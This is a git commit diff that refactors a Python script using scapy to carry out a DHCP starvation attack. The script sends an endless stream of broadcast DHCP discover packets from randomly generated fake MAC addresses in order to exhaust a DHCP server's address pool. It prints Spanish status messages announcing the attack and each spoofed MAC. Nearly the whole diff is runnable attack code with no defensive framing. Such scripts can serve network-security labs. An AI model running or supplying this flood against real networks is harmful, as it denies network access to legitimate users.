c6bade32167d4390f259654f5df523b14066dd06
RichardMC7 <richardmartecustodio@gmail.com>
2026-02-11 20:15:35 -0400

    Refactor DHCP Starvation attack logic
    Refactor DHCP starvation attack script for clarity and structure.

--- DHCP_Starvation.py
+++ DHCP_Starvation.py
@@ -2,32 +2,31 @@ from scapy.all import *
 import random
 
 conf.checkIPaddr = False
-
-
 iface = "eth0"
-
-def random_mac():
-return "02:%02x:%02x:%02x:%02x:%02x" % (
-random.randint(0,255),
-random.randint(0,255),
-random.randint(0,255),
-random.randint(0,255),
-random.randint(0,255)
-)
 
 print("Iniciando ataque DHCP Starvation...")
 
+def random_mac():
+    return "02:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0,255),
+        random.randint(0,255),
+        random.randint(0,255),
+        random.randint(0,255),
+        random.randint(0,255)
+    )
+
 while True:
-mac = random_mac()
 
-```
-packet = (
-    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-    IP(src="0.0.0.0", dst="255.255.255.255") /
-    UDP(sport=68, dport=67) /
-    BOOTP(chaddr=RandString(12, b'\x00')) /
-    DHCP(options=[("message-type", "discover"), "end"])
-)
+    mac = random_mac()
 
-sendp(packet, iface=iface, verbose=False)
-```
+    dhcp_discover = (
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(chaddr=RandString(12, b'\x00')) /
+        DHCP(options=[("message-type", "discover"), "end"])
+    )
+
+    sendp(dhcp_discover, iface=iface, verbose=False)
+
+    print("MAC falsa enviada:", mac)
